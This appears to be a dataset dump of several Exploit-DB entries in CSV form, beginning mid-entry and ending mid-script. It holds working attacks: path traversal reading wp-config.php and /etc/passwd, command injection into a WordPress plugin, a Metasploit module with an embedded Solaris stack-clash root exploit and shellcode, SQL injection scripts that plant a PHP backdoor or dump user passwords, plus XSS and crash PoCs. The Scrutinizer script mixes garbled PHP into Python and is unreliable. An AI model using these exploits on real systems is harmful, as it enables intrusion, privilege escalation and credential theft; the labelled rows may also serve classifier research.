retrieve the wp-config.php file:  GET /wp-admin/admin.php?page=ELISQLREPORTS-settings&Download_SQL_Backup=../../../wp-config.php HTTP/1.1 Host: <the host with the wordpress> Proxy-Connection: keep-alive Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Upgrade-Insecure-Requests: 1 User-Agent: <User-Agent> Referer: http://<the host with the wordpress>/wp-admin/admin.php?page=ELISQLREPORTS-settings Accept-Encoding: gzip, deflate, sdch Accept-Language: en-US,en;q=0.8,es;q=0.6 Cookie: wordpress_[...etc...]4af418c3efd   # Exploit Title: EZ SQL Reports < 4.11.37: Arbitrary Code Execution (admin/colaborator required) # Google Dork: - # Date: 12/09/2015 # Exploit Author: Felipe Molina (@felmoltor) # Vendor Homepage: https://wordpress.org/plugins/elisqlreports/ # Software Link: https://downloads.wordpress.org/plugin/elisqlreports.4.11.33.zip # Version: < 4.11.33, fixed in 4.11.37 # Tested on: Debian GNU/Linux 7 with Wordpress 4.3 # CVE : N/A # # Summary: There are several calls to ""passtthru"" in the code, one of them is receiving the username, password, database name and host from the $_POST arguments, so you can inject in every of this parameter the "";"" character or others like ""&&"" or ""||"" to execute other distinct commands to ""/usr/bin/mysql"" # # Timeline: # - 09/09/2015: Fist contact with the author # - 11/09/2015: Author creates fix and communicate to me # - 12/09/2015: Public release of the new plugin version  # POC: Send a POST request like this to obtain in the folder wp-admin a file with name ""testrce.txt"". The parameters DB_NAME, DB_HOST, DB_USER, and DB_PASSWORD are injectable:  POST /wp-admin/admin.php?page=ELISQLREPORTS-settings HTTP/1.1 Host: <wordpress web> Proxy-Connection: keep-alive Content-Length: 177 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Origin: http://<wordpress web> Upgrade-Insecure-Requests: 1 User-Agent: <the user agent> Content-Type: application/x-www-form-urlencoded Referer: http://<wordpress web>/wp-admin/admin.php?page=ELISQLREPORTS-settings Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8,es;q=0.6 Cookie: wordpress_8fa[...etc...]b7d  DB_NAME=<the db name>%3B+touch+testrce.txt%3B+&DB_HOST=127.0.0.1&DB_USER=<theuser>&DB_PASSWORD=<thepassword>&db_date=z.2015-08-27-20-22-29.manual.wp.127.0.0.1.sql.zip&db_nonce=au78c5ff86",WordPress Plugin EZ SQL Reports,1
39397,"WPS Office < 2016 - '.ppt' drawingContainer Memory Corruption #####################################################################################  Application: WPS Office  Platforms: Windows  Versions: Version 2016  Author: Francis Provencher of COSIG  Twitter: @COSIG_  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  =============== 1) Introduction ===============  WPS Office (an acronym for Writer, Presentation and Spreadsheets,[2] previously known as Kingsoft Office) is an office  suite for Microsoft Windows, Linux,[1] iOS[3] and Android OS,[4] developed by Zhuhai-basedChinese software developer Kingsoft.  WPS Office is a suite of software which is made up of three primary components: WPS Writer, WPS Presentation, and WPS Spreadsheet.  The personal basic version is free to use, but a watermark is printed on all printed output after the 30 day trial ends.  (https://en.wikipedia.org/wiki/WPS_Office)  #####################################################################################  ============================ 2) Report Timeline ============================  2015-12-31: Francis Provencher from COSIG report the issue to WPS; 2016-01-04: WPS security confirm this issue; 2016-01-14: COSIG ask an update status; 2016-01-21: COSIG ask an update status; 2016-02-01: COSIG release this advisory;  #####################################################################################  ============================ 3) Technical details ============================  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of WPS. User interaction is required to exploit this vulnerability in that the target must open a malicious file.  The specific flaw exists within the handling of a crafted Presentation files with an invalid “Length” header in a drawingContainer. By providing a malformed .ppt file, an attacker can cause an memory corruption by dereferencing an uninitialized pointer.  #####################################################################################  ===========  4) POC  ===========  http://protekresearchlab.com/exploits/COSIG-2016-06.ppt https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39397.zip  ###############################################################################",Spreadsheet,0
45625,"Solaris - RSH Stack Clash Privilege Escalation (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   Rank = GoodRanking    include Msf::Post::File   include Msf::Post::Solaris::Priv   include Msf::Post::Solaris::System   include Msf::Post::Solaris::Kernel   include Msf::Exploit::EXE   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Solaris RSH Stack Clash Privilege Escalation',       'Description'    => %q{         This module exploits a vulnerability in RSH on unpatched Solaris         systems which allows users to gain root privileges.          The stack guard page on unpatched Solaris systems is of         insufficient size to prevent collisions between the stack         and heap memory, aka Stack Clash.          This module uploads and executes Qualys' Solaris_rsh.c exploit,         which exploits a vulnerability in RSH to bypass the stack guard         page to write to the stack and create a SUID root shell.          This module has offsets for Solaris versions 11.1 (x86) and         Solaris 11.3 (x86).          Exploitation will usually complete within a few minutes using         the default number of worker threads (10). Occasionally,         exploitation will fail. If the target system is vulnerable,         usually re-running the exploit will be successful.          This module has been tested successfully on Solaris 11.1 (x86)         and Solaris 11.3 (x86).       },       'References'     =>         [           ['BID', '99151'],           ['BID', '99153'],           ['CVE', '2017-1000364'],           ['CVE', '2017-3629'],           ['CVE', '2017-3630'],           ['CVE', '2017-3631'],           ['EDB', '42270'],           ['URL', 'http://www.oracle.com/technetwork/security-advisory/alert-cve-2017-3629-3757403.html'],           ['URL', 'https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash'],           ['URL', 'https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt']         ],       'Notes'          => { 'AKA' => ['Stack Clash', 'Solaris_rsh.c'] },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Qualys Corporation', # Stack Clash technique and Solaris_rsh.c exploit           'Brendan Coles'       # Metasploit         ],       'DisclosureDate' => 'Jun 19 2017',       'Privileged'     => true,       'Platform'       => ['unix'],       'Arch'           => [ARCH_X86, ARCH_X64],       'SessionTypes'   => ['shell', 'meterpreter'],       'Targets'        =>         [           ['Automatic', {}],           ['Solaris 11.1', {}],           ['Solaris 11.3', {}]         ],       'DefaultOptions' =>         {           'PAYLOAD'     => 'cmd/unix/bind_netcat',           'WfsDelay'    => 10,           'PrependFork' => true         },       'DefaultTarget'  => 0))     register_options [       OptInt.new('WORKERS', [true, 'Number of workers', '10']),       OptString.new('RSH_PATH', [true, 'Path to rsh executable', '/usr/bin/rsh'])     ]     register_advanced_options [       OptBool.new('ForceExploit',  [false, 'Override check result', false]),       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])     ]   end    def rsh_path     datastore['RSH_PATH']   end    def mkdir(path)     vprint_status ""Creating '#{path}' directory""     cmd_exec ""mkdir -p #{path}""     register_dir_for_cleanup path   end    def upload(path, data)     print_status ""Writing '#{path}' (#{data.size} bytes) ...""     rm_f path     write_file path, data     register_file_for_cleanup path   end    def upload_and_compile(path, data)     upload ""#{path}.c"", data      output = cmd_exec ""PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -Wall -std=gnu99 -o #{path} #{path}.c""     unless output.blank?       print_error output       fail_with Failure::Unknown, ""#{path}.c failed to compile""     end      register_file_for_cleanup path   end    def symlink(link_target, link_name)     print_status ""Symlinking #{link_target} to #{link_name}""     rm_f link_name     cmd_exec ""ln -sf #{link_target} #{link_name}""     register_file_for_cleanup link_name   end    def check     unless setuid? rsh_path       vprint_error ""#{rsh_path} is not setuid""       return CheckCode::Safe     end     vprint_good ""#{rsh_path} is setuid""      unless has_gcc?       vprint_error 'gcc is not installed'       return CheckCode::Safe     end     vprint_good 'gcc is installed'      version = kernel_version     if version.to_s.eql? ''       vprint_error 'Could not determine Solaris version'       return CheckCode::Detected     end      unless ['11.1', '11.3'].include? version       vprint_error ""Solaris version #{version} is not vulnerable""       return CheckCode::Safe     end     vprint_good ""Solaris version #{version} appears to be vulnerable""      CheckCode::Detected   end    def exploit     if is_root?       fail_with Failure::BadConfig, 'Session already has root privileges'     end      unless check == CheckCode::Detected       unless datastore['ForceExploit']         fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'       end       print_warning 'Target does not appear to be vulnerable'     end      unless writable? datastore['WritableDir']       fail_with Failure::BadConfig, ""#{datastore['WritableDir']} is not writable""     end      if target.name.eql? 'Automatic'       case kernel_version       when '11.1'         my_target = targets[1]         arg = 0       when '11.3'         my_target = targets[2]         arg = 1       else         fail_with Failure::NoTarget, 'Unable to automatically select a target'       end     else       my_target = target     end     print_status ""Using target: #{my_target.name}""      base_path = ""#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}""     mkdir base_path      # Solaris_rsh.c by Qualys     # modified for Metasploit     workers = datastore['WORKERS'].to_i     root_shell = 'ROOT'     shellcode = '\x31\xc0\x50\x68'     shellcode << root_shell     shellcode << '\x89\xe3\x50\x53\x89\xe2\x50\x50'     shellcode << '\x52\x53\xb0\x3C\x48\x50\xcd\x91'     shellcode << '\x31\xc0\x40\x50\x50\xcd\x91Z'     exp = <<-EOF /*  * Solaris_rsh.c for CVE-2017-3630, CVE-2017-3629, CVE-2017-3631  * Copyright (C) 2017 Qualys, Inc.  *  * This program is free software: you can redistribute it and/or modify  * it under the terms of the GNU General Public License as published by  * the Free Software Foundation, either version 3 of the License, or  * (at your option) any later version.  *  * This program is distributed in the hope that it will be useful,  * but WITHOUT ANY WARRANTY; without even the implied warranty of  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the  * GNU General Public License for more details.  *  * You should have received a copy of the GNU General Public License  * along with this program.  If not, see <http://www.gnu.org/licenses/>.  */  #include <errno.h> #include <fcntl.h> #include <signal.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/fcntl.h> #include <sys/resource.h> #include <sys/stat.h> #include <sys/time.h> #include <sys/types.h> #include <sys/wait.h> #include <unistd.h>  #ifndef timersub #define timersub(a, b, result) \\     do { \\         (result)->tv_sec = (a)->tv_sec - (b)->tv_sec; \\         (result)->tv_usec = (a)->tv_usec - (b)->tv_usec; \\         if ((result)->tv_usec < 0) { \\             --(result)->tv_sec; \\             (result)->tv_usec += 1000000; \\         } \\     } while (0) #endif  #define RSH ""#{rsh_path}"" static const struct target * target; static const struct target {     const char * name;     size_t s_first, s_last, s_step;     size_t l_first, l_last, l_step;     size_t p_first, p_last, p_step;     size_t a, b;     size_t i, j; } targets[] = {     {         .name = ""Oracle Solaris 11.1 X86 (Assembled 19 September 2012)"",         .s_first = 16*1024, .s_last = 44*1024, .s_step = 4096,         .l_first = 192,     .l_last = 512,     .l_step = 16,         .p_first = 0,       .p_last = 8192,    .p_step = 1,         .a = 0,             .b = 15,           .j = 12,         .i = 0x08052608 /* pop edx; pop ebp; ret */     },     {         .name = ""Oracle Solaris 11.3 X86 (Assembled 06 October 2015)"",         .s_first = 12*1024, .s_last = 44*1024, .s_step = 4096,         .l_first = 96,      .l_last = 512,     .l_step = 4,         .p_first = 0,       .p_last = 4096,    .p_step = 4,         .a = 0,             .b = 3,            .j = SIZE_MAX,         .i = 0x07faa7ea /* call *0xc(%ebp) */     }, };  #define ROOTSHELL ""#{root_shell}"" static const char shellcode[] = ""#{shellcode}"";  static volatile sig_atomic_t sigalarm;  static void sigalarm_handler(const int signum __attribute__((__unused__))) {     sigalarm = 1; }  #define die() do { \\     fprintf(stderr, ""died in %s: %u\\n"", __func__, __LINE__); \\     exit(EXIT_FAILURE); \\ } while (0)  static int is_suid_root(const char * const file) {     if (!file) die();     static struct stat sbuf;     if (stat(file, &sbuf)) die();     if (!S_ISREG(sbuf.st_mode)) die();     return ((sbuf.st_uid == 0) && (sbuf.st_mode & S_ISUID)); }  static const char * build_lca(const size_t l) {     static const size_t shellcode_len = sizeof(shellcode)-1;     if (shellcode_len > 64) die();     if (shellcode_len % 16) die();     if (l < shellcode_len + target->a + target->b) die();      #define LCA_MAX 4096     if (l > LCA_MAX) die();     static char lca[128 + LCA_MAX];     strcpy(lca, ""LC_ALL="");     char * cp = memchr(lca, '\\0', sizeof(lca));     if (!cp) die();     memcpy(cp, shellcode, shellcode_len);     cp += shellcode_len;     memset(cp, 'a', target->a);      size_t o;     for (o = target->a; l - o >= 4; o += 4) {         if ((o - target->a) % 16 == target->j) {             cp[o + 0] = '\\xeb';             cp[o + 1] = (o - target->a >= 16) ? -(16u + 2u) :                 -(shellcode_len + target->a + target->j + 2);             cp[o + 2] = 'j';             cp[o + 3] = 'j';         } else {             if (sizeof(size_t) != 4) die();             *(size_t *)(cp + o) = target->i;         }     }     cp += o;     memset(cp, 'b', target->b);     cp[target->b] = '\\0';     if (strlen(lca) != 7 + shellcode_len + o + target->b) die();     return lca; }  static const char * build_pad(const size_t p) {     #define PAD_MAX 8192     if (p > PAD_MAX) die();     static char pad[64 + PAD_MAX];     strcpy(pad, ""P="");     char * const cp = memchr(pad, '\\0', sizeof(pad));     if (!cp) die();     memset(cp, 'p', p);     cp[p] = '\\0';     if (strlen(pad) != 2 + p) die();     return pad; }  static void fork_worker(const size_t s, const char * const lca, const char * const pad) {     #define N_WORKERS #{workers.to_i}     static size_t n_workers;     static struct {         pid_t pid;         struct timeval start;     } workers[N_WORKERS];      size_t i_worker;     struct timeval start, stop, diff;      if (n_workers >= N_WORKERS) {         if (n_workers != N_WORKERS) die();         int is_suid_rootshell = 0;         for (;;) {             sigalarm = 0;             #define TIMEOUT 10             alarm(TIMEOUT);             int status = 0;             const pid_t pid = waitpid(-1, &status, WUNTRACED);             alarm(0);             if (gettimeofday(&stop, NULL)) die();              if (pid <= 0) {                 if (pid != -1) die();                 if (errno != EINTR) die();                 if (sigalarm != 1) die();             }             int found_pid = 0;             for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {                 const pid_t worker_pid = workers[i_worker].pid;                 if (worker_pid <= 0) die();                 if (worker_pid == pid) {                     if (found_pid) die();                     found_pid = 1;                     if (WIFEXITED(status) || WIFSIGNALED(status))                         workers[i_worker].pid = 0;                 } else {                     timersub(&stop, &workers[i_worker].start, &diff);                     if (diff.tv_sec >= TIMEOUT)                         if (kill(worker_pid, SIGKILL)) die();                 }             }             if (!found_pid) {                 if (pid != -1) die();                 continue;             }             if (WIFEXITED(status)) {                 if (WEXITSTATUS(status) != EXIT_FAILURE)                     fprintf(stderr, ""exited %d\\n"", WEXITSTATUS(status));                 break;             } else if (WIFSIGNALED(status)) {                 if (WTERMSIG(status) != SIGSEGV)                     fprintf(stderr, ""signal %d\\n"", WTERMSIG(status));                 break;             } else if (WIFSTOPPED(status)) {                 fprintf(stderr, ""stopped %d\\n"", WSTOPSIG(status));                 is_suid_rootshell |= is_suid_root(ROOTSHELL);                 if (kill(pid, SIGKILL)) die();                 continue;             }             fprintf(stderr, ""unknown %d\\n"", status);             die();         }         if (is_suid_rootshell) {             system(""ls -lL "" ROOTSHELL);             exit(EXIT_SUCCESS);         }         n_workers--;     }     if (n_workers >= N_WORKERS) die();      static char rsh_link[64];     if (*rsh_link != '/') {         const int rsh_fd = open(RSH, O_RDONLY);         if (rsh_fd <= STDERR_FILENO) die();         if ((unsigned int)snprintf(rsh_link, sizeof(rsh_link),             ""/proc/%ld/fd/%d"", (long)getpid(), rsh_fd) >= sizeof(rsh_link)) die();         if (access(rsh_link, R_OK | X_OK)) die();         if (*rsh_link != '/') die();     }      static int null_fd = -1;     if (null_fd <= -1) {         null_fd = open(""/dev/null"", O_RDWR);         if (null_fd <= -1) die();     }      const pid_t pid = fork();     if (pid <= -1) die();     if (pid == 0) {         const struct rlimit stack = { s, s };         if (setrlimit(RLIMIT_STACK, &stack)) die();          if (dup2(null_fd, STDIN_FILENO) != STDIN_FILENO) die();         if (dup2(null_fd, STDOUT_FILENO) != STDOUT_FILENO) die();         if (dup2(null_fd, STDERR_FILENO) != STDERR_FILENO) die();          static char * const argv[] = { rsh_link, ""-?"", NULL };         char * const envp[] = { (char *)lca, (char *)pad, NULL };         execve(*argv, argv, envp);         die();     }     if (gettimeofday(&start, NULL)) die();     for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {         const pid_t worker_pid = workers[i_worker].pid;         if (worker_pid > 0) continue;         if (worker_pid != 0) die();         workers[i_worker].pid = pid;         workers[i_worker].start = start;         n_workers++;         return;     }     die(); }  int main(const int argc, const char * const argv[]) {     static const struct rlimit core;     if (setrlimit(RLIMIT_CORE, &core)) die();      if (geteuid() == 0) {         if (is_suid_root(ROOTSHELL)) {             if (setuid(0)) die();             if (setgid(0)) die();             static char * const argv[] = { ""/bin/sh"", NULL };             execve(*argv, argv, NULL);             die();         }         chown(*argv, 0, 0);         chmod(*argv, 04555);         for (;;) {             raise(SIGSTOP);             sleep(1);         }         die();     }      const size_t i = strtoul(argv[1], NULL, 10);     if (i >= sizeof(targets)/sizeof(*targets)) die();     target = targets + i;     fprintf(stderr, ""Target %zu %s\\n"", i, target->name);      if (target->a >= 16) die();     if (target->b >= 16) die();     if (target->i <= 0) die();     if (target->j >= 16 || target->j % 4) {         if (target->j != SIZE_MAX) die();     }      static const struct sigaction sigalarm_action = { .sa_handler = sigalarm_handler };     if (sigaction(SIGALRM, &sigalarm_action, NULL)) die();      size_t s;     for (s = target->s_first; s <= target->s_last; s += target->s_step) {         if (s % target->s_step) die();          size_t l;         for (l = target->l_first; l <= target->l_last; l += target->l_step) {             if (l % target->l_step) die();             const char * const lca = build_lca(l);             fprintf(stdout, ""s %zu l %zu\\n"", s, l);              size_t p;             for (p = target->p_first; p <= target->p_last; p += target->p_step) {                 if (p % target->p_step) die();                 const char * const pad = build_pad(p);                 fork_worker(s, lca, pad);             }         }     }     fprintf(stdout, ""Failed\\n""); }     EOF      exploit_name = "".#{rand_text_alphanumeric 5..15}""     upload_and_compile ""#{base_path}/#{exploit_name}"", exp     symlink ""#{base_path}/#{exploit_name}"", ""#{base_path}/#{root_shell}""      print_status ""Creating suid root shell. This may take a while...""     cmd_exec ""cd #{base_path}""     start = Time.now     output = cmd_exec ""./#{exploit_name} #{arg}"", nil, 1_800     stop = Time.now     print_status ""Completed in #{(stop - start).round(2)}s""     unless output.include? 'root'       fail_with Failure::Unknown, ""Failed to create suid root shell: #{output}""     end     print_good ""suid root shell created: #{base_path}/#{root_shell}""      payload_name = "".#{rand_text_alphanumeric 5..10}""     payload_path = ""#{base_path}/#{payload_name}""     upload payload_path, payload.encoded     cmd_exec ""chmod +x '#{payload_path}'""      print_status 'Executing payload...'     cmd_exec ""echo #{payload_path} | ./#{root_shell} & echo ""   end end",Solaris_rsh.c,0
16227,"iSO Filer Lite 2.1.0 - Directory Traversal # Exploit Title: Filer Lite v2.1.0 for iPhone / iPod touch, Directory Traversal  # Date: 02/24/2011 # Author: R3d@l3rt, Sp@2K, Sunlight, H@ckk3y # Software Link : http://itunes.apple.com/kr/app/filer-lite-download-view-manage/id350939597?mt=8 # Version: 2.1.0 # Tested on: iPhone, iPod 3GS with 4.2.1 firmware    # There is directory traversal vulnerability in the Filer Lite.   # Exploit Testing  C:\>ftp ftp> open 192.168.0.70 2121 Connected to 192.168.0.70. 220 DiddyFTP server ready. User (192.168.0.70:(none)): anonymous 331 Password required for anonymous Password: 230 User anonymous logged in. ftp> dir 200 PORT command successful. 150 Opening ASCII mode data connection for '/bin/ls'. total 1 drwxr-xr-x     2 mobile mobile        136 Feb 24 15:42 Filer Help Files 226 Transfer complete. ftp: 81 bytes received in 0.00Seconds 81000.00Kbytes/sec. ftp> get ../../../../../etc/passwd 200 PORT command successful. 150 Opening BINARY mode data connection for '../../../../../etc/passwd'. 226 Transfer complete. ftp: 785 bytes received in 0.00Seconds 785000.00Kbytes/sec. ftp> get ../../../../../../private/var/mobile/Library/Preferences/com.apple.conference.plist 200 PORT command successful. 150 Opening BINARY mode data connection for '../../../../../../private/var/mobile/Library/Preferences/com.apple.conference.plist'. 226 Transfer complete. ftp: 270 bytes received in 0.00Seconds 270000.00Kbytes/sec. ftp> quit  C:\>type passwd # # 4.3BSD-compatable User Database # # Note that this file is not consulted for login. # It only exisits for compatability with 4.3BSD utilities. # # This file is automatically re-written by various system utilities. # Do not edit this file.  Changes will be lost. # nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh mobile:*:501:501:Mobile User:/var/mobile:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _wireless:*:25:25:Wireless Services:/var/wireless:/usr/bin/false _securityd:*:64:64:securityd:/var/empty:/usr/bin/false _mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false _sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false _unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false  C:\>type com.apple.conference.plist bplist00?_restoredFromBackup\natTypeCache? _DIPv4.Router=192.168.0.1;IPv4.RouterHardwareAddress=1c:bd:b9:XX:XX:XX_EIPv4.R outer=192.168.11.1;IPv4.RouterHardwareAddress=00:24:a5:XX:XX:XX?  XnatFlag C:\>    # IPhone inside information  1. Phone Book  - /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb       2. Safari Favorites List  - /private/var/mobile/Library/Safari  3. Users E-mail Information  - /private/var/mobile/Library/Preferences/com.apple.accountsettings.plist  4. IPv4 Router Information  - /private/var/mobile/Library/Preferences/com.apple.conference.plist",iSO Filer Lite,1
20033,"Dell SonicWALL Scrutinizer 9.0.1 - 'statusFilter.php?q' SQL Injection #!/usr/bin/python  ###################################################################################### # Exploit Title: Dell SonicWALL Scrutinizer 9.0.1 (statusFilter.php q parameter) SQL Injection # Date: Jul 22 2012 # Author: muts # Version: SonicWALL Scrutinizer 9.0.1 # Vendor URL: http://www.sonicwall.com # # Special thanks to: Tal Zeltzer # # Timeline: # # 12 Jun 2012: Vulnerability reported to CERT # 22 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012 # Unknown: Patch released: http://t.co/qoY9LHkO # 22 Jul 2012: Public Disclosure # ######################################################################################    import sys,urllib2,urllib  #php = ""<?php echo system($_GET['c']); ?>""  $rhost=""172.16.164.1""; $lport=4444; function encode_ip($user_ip) {     $ip = explode('.', $user_ip);     return sprintf('%02x%02x%02x%02x', $ip[0], $ip[1], $ip[2], $ip[3]); } $stringdechex($lport).'C705A2314000'. encode_ip($rhosta=str_replace(""Z"",""000000000000000000000000000000"",$string); $php=str_replace(""Y"",""00000"",$a);  def exploit_mysql(target, phpScript):     target += '/d4d/statusFilter.php'     req = urllib2.Request(url = target)     query = ""AAA' "" # First escape the sql query leaving everything valid                     # then we dump the php-script into the web-server's directory     query += ""union select 0x%s,0 into outfile 'C:\\\\Program Files\\\\Scrutinizer\\\\html\\\\my.php'"" % phpScript.encode('hex')     query += ""#""    # And finally we terminate the query      values = { 'commonJson': 'protList',                'q': query                }     req.add_data(urllib.urlencode(values))     try:         response = urllib2.urlopen(req)     except:         return(False)     body = response.read() #    print body     if ""No Results Found"" in body:         return(True)     return(False)  if len(sys.argv) != 2: 	print ""Usage: "" + sys.argv[0] + "" "" + ""http://www.example.com:8080/"" 	sys.exit(0)  target = sys.argv[1]  print '[*] Trying to SQL inject on %s' % target if exploit_mysql(target, php) == True:         print '[*] Created a backdoor at %smy.php' % target 	urllib.urlopen('%smy.php' % target)  else:         print '[*] Failed to backdoor the server'",Dell SonicWALL Scrutinizer,1
42499,"SOA School Management 3.0 - SQL Injection # # # # # # Exploit Title: SOA School Management 3.0 - SQL Injection # Dork: N/A # Date: 18.08.2017 # Vendor Homepage : https://ynetinteractive.com/ # Software Link: http://codecanyon.net/item/soa-school-management-software-with-integrated-parents-students-portal/20435367?s_rank=3 # Demo: http://demo.ynetinteractive.com/soa/ # Version: 3.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... # # Proof of Concept: # http://localhost/[PATH]/drivers/jquery/usersession_exam.php?id=[SQL] # http://localhost/[PATH]/drivers/jquery/session_exam.php?id=[SQL] # 1'+/*!44444union*/+/*!44444select*/+1,2,(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32)),4,5--+- # 1'+/*!44444union*/+/*!44444select*/+1,2,concat(username,0x3a,password),4,5+from+users--+- #  # http://localhost/[PATH]/Assignment.php?student_id=[SQL] # 7'and+(select+0x31+from (select+count(*),concat((select(select concat(cast(database() as char),0x7e))+from information_schema.tables+where table_schema=database()+limit 0,1),floor(rand(0)*2))x from+information_schema.tables+group+by+x)a)+AND ''=' #  # http://localhost/[PATH]/Fee.php?pay&student_id=7&fee_id=[SQL] #  # http://localhost/[PATH]/YearBook.php?session_id=[SQL] #  # http://localhost/[PATH]/Transaction.php?invoice=[SQL] #  # Etc... # # # # #",SOA School Management,1
15328,"BloofoxCMS Registration Plugin - SQL Injection Vulnerability ID: HTB22658 Reference: http://www.htbridge.ch/advisory/sql_injection_in_bloofoxcms_registration_plugin.html Product: BloofoxCMS  Vendor: bloofox.com ( http://bloofox.com/ )  Vulnerable Version: 0.3.5 and probably prior versions  Vendor Notification: 13 October 2010  Vulnerability Type: SQL Injection Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in gender variable.  The following PoC is available:   <form action=""http://host/index.php?page=8"" method=""post""> <input type=""hidden"" name=""un"" value=""testuser""> <input type=""hidden"" name=""pwd"" value=""123456""> <input type=""hidden"" name=""pwd2"" value=""123456""> <input type=""hidden"" name=""em"" value=""email@email.com""> <input type=""hidden"" name=""gender"" value=""'SQL_CODE_HERE""> <input name=""send"" value=""Register & Create Account"" type=""submit""> </form>",BloofoxCMS Registration Plugin,1
47909,"Backup Key Recovery 2.2.5 - 'Name' Denial of Service (PoC) # Exploit Title: Backup Key Recovery 2.2.5 - 'Name' Denial of Service (PoC) # Exploit Author : Ismail Tasdelen # Exploit Date: 2020-01-06 # Vendor Homepage : http://www.nsauditor.com/ # Link Software : http://www.nsauditor.com/downloads/backeyrecovery_setup.exe # Tested on OS: Windows 10 # CVE : N/A  ''' Proof of Concept (PoC): =======================  1.Download and install Backup Key Recovery 2.Run the python operating script that will create a file (poc.txt) 3.Run the software ""Register -> Enter Registration Code 4.Copy and paste the characters in the file (poc.txt) 5.Paste the characters in the field 'Name' and click on 'Ok' 6.Backup Key Recovery Crashed '''  #!/usr/bin/python      buffer = ""A"" * 1000   payload = buffer try:     f=open(""poc.txt"",""w"")     print(""[+] Creating %s bytes evil payload."" %len(payload))     f.write(payload)     f.close()     print(""[+] File created!"") except:     print(""File cannot be created."")",Backup Key Recovery,1
31525,"MyBB Extended Useradmininfo Plugin 1.2.1 - Cross-Site Scripting # Exploit Title: Extended Useradmininfo MyBB Plugin 1.2.1 - Cross Site Scripting # Google Dork: N/A # Date: 09.02.2014 # Exploit Author: Fikri Fadzil - fikri.fadzil@impact-alliance.org # Vendor Homepage: http://forum.mybboard.de/user-9022.html # Software Link: http://mods.mybb.com/view/extended-useradmininfo # Version: 1.2.1 # Tested on: PHP  Description: This plugin shows advanced Informations about a user, such as last IP, User Agent, Browser and Operating System. The information will be shown in a user profile and visible only  for people who are able to see the adminoptions on user profiles.  Proof of Concept 1. Create a user account. 2. Change your user-agent to ""Mozilla<script>alert(1)</script>"". 3. Login and then... logout.  * The script will be executed whenever the administrator view your profile.   Solution: Replace the content of ""inc/plugins/extendeduseradmininfos.php"" with this fix: http://pastebin.com/ncQCvwdq",MyBB Extended Useradmininfo Plugin,1
45930,"Joomla! Component JE Photo Gallery 1.1 - 'categoryid' SQL Injection # Exploit Title: Joomla! Component JE Photo Gallery 1.1 - SQL Injection # Dork: N/A # Date: 2018-11-26 # Exploit Author: Ihsan Sencan # Vendor Homepage: https://joomlaextensions.co.in # Software Link: http://joomlaextensions.co.in/download/1387375463_JE%20PhotoGallery%20(%20J-%203.0%20).zip # Version: 1.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1)   #!/usr/bin/perl -w  sub clear{ system(($^O eq 'MSWin32') ? 'cls' : 'clear'); } clear(); print ""                                      ./                                    (o o) ###############################oOOo-(-)-oOOo###############################         ______  _______ ___    _   __   _____ _______   ___________    _   __         /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / /         / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /      _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /     /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/                                     WWW.IHSAN.NET                                                                       +                                      	   Joomla! Component JE Photo Gallery 1.1 - SQL Injection          ############################################################################ "";  use LWP::UserAgent; print ""\nTarget:[http://site.com/path/]: ""; chomp(my $target=<STDIN>); print ""\n[!] Exploiting Progress...\n""; print ""\n""; $UT=""wizjk_users""; $S=""index.php?""; $I=""tmpl=component&option=com_jephotogallery&view=category&task=fetchimage&categoryid=""; 